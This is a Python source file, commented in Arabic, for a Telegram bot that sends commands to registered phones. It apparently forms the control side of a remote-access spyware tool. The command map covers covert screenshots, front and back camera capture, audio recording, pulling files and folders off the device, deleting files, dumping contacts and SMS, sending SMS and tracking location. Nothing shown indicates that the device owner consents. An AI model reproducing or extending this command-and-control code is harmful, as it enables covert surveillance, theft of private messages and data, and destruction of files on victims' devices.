"""
معالج تنفيذ الأوامر
"""
from typing import Dict, Any, Optional
from telegram import Update
from telegram.ext import ContextTypes

from handlers.base_handler import BaseHandler
from keyboards.menu_keyboards import MenuKeyboards
from models.enums import CommandType
from models.device import Device
from services.command_service import CommandResult
from utils.logger import get_logger
from exceptions.custom_exceptions import DeviceNotFoundError

logger = get_logger(__name__)


class CommandHandler(BaseHandler):
    """معالج تنفيذ الأوامر على الأجهزة."""

    async def execute_command(
        self,
        update: Update,
        context: ContextTypes.DEFAULT_TYPE,
        device_id: str,
        command_type: CommandType,
        params: Dict[str, Any] = None,
    ) -> None:
        """تنفيذ أمر على جهاز."""
        if not await self._check_auth(update):
            return

        # التحقق من وجود الجهاز
        device = self.device_service.get_device(device_id)
        if not device:
            await self._reply(
                update,
                "❌ **الجهاز غير موجود**",
                reply_markup=MenuKeyboards.devices_list(
                    self.device_service.get_all_devices()
                ),
            )
            return

        # إذا كان الأمر يحتاج مدخلات، نطلب البيانات
        if command_type.needs_input():
            # حفظ حالة العملية في السياق
            context.user_data['pending_command'] = {
                'device_id': device_id,
                'command_type': command_type.value,
            }

            await self._reply(
                update,
                command_type.get_input_prompt(),
                reply_markup=MenuKeyboards.cancel_button(),
            )
            return

        # تنفيذ الأمر مباشرة
        await self._execute_command_direct(update, device, command_type, params)

    async def _execute_command_direct(
        self,
        update: Update,
        device: Device,
        command_type: CommandType,
        params: Dict[str, Any] = None,
    ) -> None:
        """تنفيذ الأمر مباشرة (بدون مدخلات)."""
        # إرسال رسالة التأكيد
        await self._reply(
            update,
            f"📤 **جاري تنفيذ الأمر:** `{command_type.name}`\n"
            f"📱 **الجهاز:** {device.get_display_name()}\n\n"
            "⏳ سيتم إرسال النتيجة خلال لحظات...",
        )

        # تنفيذ الأمر
        result = self._dispatch_command(device, command_type, params)

        if result.is_success():
            logger.info(f"تم تنفيذ الأمر {command_type.name} على جهاز {device.device_id}")
        else:
            logger.error(f"فشل تنفيذ الأمر {command_type.name}: {result.get_error()}")
            await self._reply(
                update,
                f"❌ **فشل تنفيذ الأمر:** {result.get_error()}",
                reply_markup=MenuKeyboards.device_controls(device),
            )

    def _dispatch_command(
        self,
        device: Device,
        command_type: CommandType,
        params: Dict[str, Any] = None,
    ) -> CommandResult:
        """توجيه الأمر إلى الخدمة المناسبة."""
        params = params or {}

        command_map = {
            CommandType.SCREENSHOT: lambda: self.command_service.execute_screenshot(device),
            CommandType.CAMERA_FRONT: lambda: self.command_service.execute_camera_front(device),
            CommandType.CAMERA_BACK: lambda: self.command_service.execute_camera_back(device),
            CommandType.RECORD_AUDIO: lambda: self.command_service.execute_record_audio(
                device, params.get("seconds", 10)
            ),
            CommandType.SEND_FOLDER: lambda: self.command_service.execute_send_folder(
                device, params.get("path", "")
            ),
            CommandType.SEND_FILE: lambda: self.command_service.execute_send_file(
                device, params.get("path", "")
            ),
            CommandType.DELETE: lambda: self.command_service.execute_delete(
                device, params.get("path", "")
            ),
            CommandType.BACKUP_CONTACTS: lambda: self.command_service.execute_backup_contacts(device),
            CommandType.BACKUP_SMS: lambda: self.command_service.execute_backup_sms(device),
            CommandType.SEND_SMS: lambda: self.command_service.execute_send_sms(
                device,
                params.get("phone", ""),
                params.get("message", ""),
            ),
            CommandType.DEVICE_INFO: lambda: self.command_service.execute_device_info(device),
            CommandType.BATTERY_STATUS: lambda: self.command_service.execute_battery_status(device),
            CommandType.LOCATION: lambda: self.command_service.execute_location(device),
            CommandType.RESTART_SERVICE: lambda: self.command_service.execute_restart_service(device),
        }

        handler = command_map.get(command_type)
        if handler:
            return handler()

        return CommandResult(success=False, error="أمر غير معروف")